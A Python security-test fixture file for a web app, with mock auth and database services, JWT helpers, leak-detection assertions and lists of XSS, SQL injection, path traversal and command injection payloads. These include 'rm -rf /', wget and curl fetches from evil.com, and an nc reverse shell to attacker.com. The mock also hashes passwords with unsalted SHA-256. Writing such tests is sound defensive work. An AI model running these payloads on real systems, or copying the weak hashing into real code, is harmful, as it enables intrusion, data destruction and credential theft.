"""
Security test configuration and utilities for SparkOps Enterprise.
Provides mock services, test data, and security testing utilities.
"""

import pytest
import asyncio
import time
from unittest.mock import Mock, AsyncMock, MagicMock
from fastapi.testclient import TestClient
from fastapi import status
import jwt
from datetime import datetime, timedelta
import secrets
import hashlib
import base64
from typing import Dict, Any, Optional

# Mock imports for testing
import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from main import app


class SecurityTestUtils:
    """Utility class for security testing."""
    
    @staticmethod
    def generate_mock_token(user_id: str, role: str = "EMPLOYEE", expires_in_hours: int = 1) -> str:
        """Generate a mock JWT token for testing."""
        payload = {
            "sub": user_id,
            "role": role,
            "iat": datetime.utcnow(),
            "exp": datetime.utcnow() + timedelta(hours=expires_in_hours),
            "jti": secrets.token_urlsafe(16)
        }
        return jwt.encode(payload, "test_secret", algorithm="HS256")
    
    @staticmethod
    def generate_expired_token(user_id: str) -> str:
        """Generate an expired JWT token."""
        payload = {
            "sub": user_id,
            "iat": datetime.utcnow() - timedelta(hours=2),
            "exp": datetime.utcnow() - timedelta(hours=1)
        }
        return jwt.encode(payload, "test_secret", algorithm="HS256")
    
    @staticmethod
    def generate_tampered_token(token: str) -> str:
        """Generate a tampered version of a token."""
        if len(token) < 20:
            return "tampered.token.format"
        return token[:-10] + "tampered"
    
    @staticmethod
    def generate_xss_payloads() -> list:
        """Generate various XSS payloads for testing."""
        return [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "'\"><script>alert('xss')</script>",
            "<svg onload=alert('xss')>",
            "<iframe src=javascript:alert('xss')>",
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<select onfocus=alert('xss') autofocus>",
            "<textarea onfocus=alert('xss') autofocus>",
            "<keygen onfocus=alert('xss') autofocus>",
            "<video><source onerror=alert('xss')>",
            "<audio src=x onerror=alert('xss')>",
            "<details open ontoggle=alert('xss')>",
            "<marquee onstart=alert('xss')>",
            "javascript:alert('xss');//",
            "<script>String.fromCharCode(88,83,83)</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/.source)</script>",
            "<script>alert(/XSS/.source)</script>",
            "<script>alert(1)</script>",
        ]
    
    @staticmethod
    def generate_sql_injection_payloads() -> list:
        """Generate various SQL injection payloads."""
        return [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "') OR ('1'='1",
            "admin'--",
            "admin' /*",
            "' OR 1=1 --",
            "' OR 1=1 #",
            "' OR 1=1/*",
            "') OR '1'='1 --",
            "') OR ('1'='1 --",
            "1' OR '1'='1",
            "1' OR '1'='1' --",
            "1' OR '1'='1' /*",
            "'; EXEC xp_cmdshell('dir'); --",
            "' EXEC xp_cmdshell('dir'); --",
            "'; DROP TABLE users; --",
            "' DROP TABLE users; --",
            "'; INSERT INTO users VALUES('hacker','password'); --",
            "' UNION SELECT * FROM users --",
            "' UNION SELECT @@version --",
            "' UNION SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA --",
            "'; SHUTDOWN; --",
            "' WAITFOR DELAY '00:00:05' --",
            "1'; WAITFOR DELAY '00:00:05' --",
            "'; SELECT pg_sleep(5) --",
            "1'; SELECT pg_sleep(5) --",
        ]
    
    @staticmethod
    def generate_path_traversal_payloads() -> list:
        """Generate path traversal payloads."""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "../../../../../../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cconfig%5csam",
            "....//....//....//etc//passwd",
            "..../..../..../windows/system32/config/sam",
            "/var/www/../../etc/passwd",
            "/var/www\\..\\..\\windows\\system32\\config\\sam",
        ]
    
    @staticmethod
    def generate_command_injection_payloads() -> list:
        """Generate command injection payloads."""
        return [
            "test; ls -la",
            "test && cat /etc/passwd",
            "test | whoami",
            "test; rm -rf /",
            "test`whoami`",
            "test$(whoami)",
            "test; wget http://evil.com/shell.txt",
            "test && curl http://evil.com/shell.sh",
            "test | nc -e /bin/sh attacker.com 4444",
            "test; /bin/sh -c 'wget http://evil.com'",
            "test && python -c 'import os; os.system(\"ls\")'",
            "test`python -c '__import__(\"os\").system(\"ls\")'`",
            "test$(python -c '__import__(\"os\").system(\"ls\")')",
            "test; perl -e 'system(\"ls\")'",
            "test && ruby -e 'system(\"ls\")'",
            "test | bash -c 'ls'",
        ]


class MockAuthService:
    """Mock authentication service for testing."""
    
    def __init__(self):
        self.users = {}
        self.sessions = {}
        self.rate_limits = {}
    
    def mock_login(self, email: str, password: str) -> Dict[str, Any]:
        """Mock login endpoint."""
        # Check rate limiting
        key = f"login:{email}"
        if key in self.rate_limits:
            if len(self.rate_limits[key]) > 5 and time.time() - self.rate_limits[key][-1] < 300:
                return {"error": "Rate limit exceeded"}
        
        if key not in self.rate_limits:
            self.rate_limits[key] = []
        self.rate_limits[key].append(time.time())
        
        # Check credentials
        if email == "test@example.com" and password == "TestPassword123!":
            token = SecurityTestUtils.generate_mock_token("test_user", "OWNER")
            return {"access_token": token, "token_type": "bearer", "user": {"id": "test_user", "role": "OWNER"}}
        
        return {"error": "Invalid credentials"}
    
    def mock_register(self, email: str, password: str, full_name: str) -> Dict[str, Any]:
        """Mock registration endpoint."""
        # Validate password strength
        if len(password) < 8:
            return {"error": "Password too short"}
        
        if password.lower() in ["password", "123456", "qwerty"]:
            return {"error": "Password too common"}
        
        # Check if user exists
        if email in self.users:
            return {"error": "User already exists"}
        
        # Create user
        user_id = f"user_{secrets.token_hex(8)}"
        self.users[email] = {
            "id": user_id,
            "email": email,
            "password": hashlib.sha256(password.encode()).hexdigest(),
            "full_name": full_name,
            "role": "EMPLOYEE"
        }
        
        token = SecurityTestUtils.generate_mock_token(user_id, "EMPLOYEE")
        return {"access_token": token, "token_type": "bearer", "user": {"id": user_id, "role": "EMPLOYEE"}}
    
    def verify_token(self, token: str) -> Optional[Dict[str, Any]]:
        """Mock token verification."""
        try:
            payload = jwt.decode(token, "test_secret", algorithms=["HS256"])
            return payload
        except jwt.ExpiredSignatureError:
            return None
        except jwt.InvalidTokenError:
            return None


class MockDatabaseService:
    """Mock database service for testing."""
    
    def __init__(self):
        self.jobs = []
        self.users = {}
        self.organizations = {}
    
    def mock_create_job(self, job_data: Dict[str, Any], user_id: str) -> Dict[str, Any]:
        """Mock job creation."""
        # Sanitize input
        sanitized_job = {
            "id": f"job_{secrets.token_hex(8)}",
            "title": self._sanitize_input(job_data.get("title", "")),
            "description": self._sanitize_input(job_data.get("description", "")),
            "client_name": self._sanitize_input(job_data.get("client_name", "")),
            "client_phone": self._mask_phone(job_data.get("client_phone", "")),
            "client_email": self._mask_email(job_data.get("client_email", "")),
            "created_by": user_id,
            "created_at": datetime.utcnow().isoformat()
        }
        
        self.jobs.append(sanitized_job)
        return sanitized_job
    
    def mock_get_jobs(self, user_id: str) -> Dict[str, Any]:
        """Mock job retrieval."""
        user_jobs = [job for job in self.jobs if job.get("created_by") == user_id]
        return {"jobs": user_jobs}
    
    def _sanitize_input(self, input_str: str) -> str:
        """Sanitize input to prevent XSS."""
        if not input_str:
            return ""
        
        # Remove HTML tags
        import re
        sanitized = re.sub(r'<[^>]*>', '', input_str)
        
        # Remove JavaScript: protocol
        sanitized = re.sub(r'javascript:', '', sanitized, flags=re.IGNORECASE)
        
        # Remove on* attributes
        sanitized = re.sub(r'on\w+\s*=', '', sanitized, flags=re.IGNORECASE)
        
        return sanitized.strip()
    
    def _mask_phone(self, phone: str) -> str:
        """Mask phone number for privacy."""
        if not phone or len(phone) < 4:
            return ""
        return phone[-4:].rjust(len(phone), '*')
    
    def _mask_email(self, email: str) -> str:
        """Mask email for privacy."""
        if not email or '@' not in email:
            return ""
        local, domain = email.split('@', 1)
        if len(local) <= 2:
            masked = '*' * len(local)
        else:
            masked = local[0] + '*' * (len(local) - 2) + local[-1]
        return f"{masked}@{domain}"


class SecurityTestFixtures:
    """Pytest fixtures for security testing."""
    
    @pytest.fixture
    def security_client(self):
        """Create test client with security mocks."""
        return TestClient(app)
    
    @pytest.fixture
    def mock_auth_service(self):
        """Create mock auth service."""
        return MockAuthService()
    
    @pytest.fixture
    def mock_db_service(self):
        """Create mock database service."""
        return MockDatabaseService()
    
    @pytest.fixture
    def valid_owner_token(self):
        """Create valid owner token."""
        return SecurityTestUtils.generate_mock_token("owner_user", "OWNER")
    
    @pytest.fixture
    def valid_employee_token(self):
        """Create valid employee token."""
        return SecurityTestUtils.generate_mock_token("employee_user", "EMPLOYEE")
    
    @pytest.fixture
    def expired_token(self):
        """Create expired token."""
        return SecurityTestUtils.generate_expired_token("test_user")
    
    @pytest.fixture
    def tampered_token(self):
        """Create tampered token."""
        valid_token = SecurityTestUtils.generate_mock_token("test_user")
        return SecurityTestUtils.generate_tampered_token(valid_token)
    
    @pytest.fixture
    def xss_payloads(self):
        """Generate XSS payloads."""
        return SecurityTestUtils.generate_xss_payloads()
    
    @pytest.fixture
    def sql_payloads(self):
        """Generate SQL injection payloads."""
        return SecurityTestUtils.generate_sql_injection_payloads()
    
    @pytest.fixture
    def path_traversal_payloads(self):
        """Generate path traversal payloads."""
        return SecurityTestUtils.generate_path_traversal_payloads()
    
    @pytest.fixture
    def command_injection_payloads(self):
        """Generate command injection payloads."""
        return SecurityTestUtils.generate_command_injection_payloads()


class SecurityTestAssertions:
    """Custom assertions for security testing."""
    
    @staticmethod
    def assert_no_sql_injection_leak(response_content: str):
        """Assert that SQL error details are not leaked."""
        sql_error_patterns = [
            r"SQL syntax",
            r"mysql_fetch",
            r"ORA-\d{5}",
            r"Microsoft OLE DB Provider",
            r"ODBC SQL Server Driver",
            r"PostgreSQL query failed",
            r"SQLite\.Exception",
            r"Warning: mysql_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError",
            r"org\.postgresql\.util\.PSQLException"
        ]
        
        for pattern in sql_error_patterns:
            matches = re.search(pattern, response_content, re.IGNORECASE)
            assert not matches, f"SQL error information leaked: {pattern}"
    
    @staticmethod
    def assert_no_stack_trace_leak(response_content: str):
        """Assert that stack traces are not leaked."""
        stack_trace_patterns = [
            r"Traceback \(most recent call last\):",
            r"at\s+.*\.java:\d+",
            r"at\s+.*\(\d+\)",
            r"System\.Reflection\.TargetInvocationException",
            r"System\.NullReferenceException",
            r"TypeError:",
            r"ReferenceError:",
            r"SyntaxError:",
            r"ValueError:",
            r"KeyError:",
            r"AttributeError:"
        ]
        
        for pattern in stack_trace_patterns:
            matches = re.search(pattern, response_content, re.IGNORECASE)
            assert not matches, f"Stack trace information leaked: {pattern}"
    
    @staticmethod
    def assert_no_path_information_leak(response_content: str):
        """Assert that file paths are not leaked."""
        path_patterns = [
            r"[A-Za-z]:\\[^\\s]+\.[a-zA-Z]+",
            r"/[^\\s]+/[a-zA-Z]+\.[a-zA-Z]+",
            r"/home/[^\\s]+",
            r"/var/www/[^\\s]+",
            r"C:\\[A-Za-z]+\\",
            r"/usr/local/[^\\s]+"
        ]
        
        for pattern in path_patterns:
            matches = re.search(pattern, response_content)
            assert not matches, f"File path information leaked: {pattern}"
    
    @staticmethod
    def assert_no_sensitive_headers(response_headers: Dict[str, str]):
        """Assert that sensitive information is not in headers."""
        sensitive_header_patterns = [
            r"server",
            r"x-powered-by",
            r"x-aspnet-version",
            r"x-aspnetmvc-version",
            r"x-php-version",
            r"x-drupal-cache",
            r"x-generator",
            r"x-version"
        ]
        
        for pattern in sensitive_header_patterns:
            for header_name, header_value in response_headers.items():
                if re.search(pattern, header_name, re.IGNORECASE):
                    assert False, f"Sensitive header exposed: {header_name}"
    
    @staticmethod
    def assert_rate_limiting_enforced(responses: list):
        """Assert that rate limiting is properly enforced."""
        rate_limited_responses = [r for r in responses if r.status_code == 429]
        assert len(rate_limited_responses) > 0, "Rate limiting not enforced"
    
    @staticmethod
    def assert_cors_properly_configured(response_headers: Dict[str, str], allowed_origin: str):
        """Assert CORS is properly configured."""
        if "Access-Control-Allow-Origin" in response_headers:
            allowed_origins = response_headers["Access-Control-Allow-Origin"]
            if allowed_origins != "*":
                assert allowed_origins == allowed_origin, f"CORS allows wrong origin: {allowed_origins}"
    
    @staticmethod
    def assert_input_sanitized(input_data: str, output_data: str):
        """Assert that input is properly sanitized."""
        # Check for XSS patterns
        xss_patterns = [
            r"<script",
            r"javascript:",
            r"on\w+\s*=",
            r"<iframe",
            r"<object",
            r"<embed"
        ]
        
        for pattern in xss_patterns:
            input_matches = re.search(pattern, input_data, re.IGNORECASE)
            output_matches = re.search(pattern, output_data, re.IGNORECASE)
            
            if input_matches and output_matches:
                assert False, f"XSS pattern not sanitized: {pattern}"


# Test configuration
SECURITY_TEST_CONFIG = {
    "max_requests_per_minute": 60,
    "max_file_size_mb": 10,
    "allowed_file_types": [".pdf", ".jpg", ".jpeg", ".png", ".txt"],
    "password_min_length": 8,
    "session_timeout_minutes": 30,
    "max_login_attempts": 5,
    "lockout_duration_minutes": 15
}


if __name__ == "__main__":
    # Run security tests
    pytest.main([__file__, "-v"])
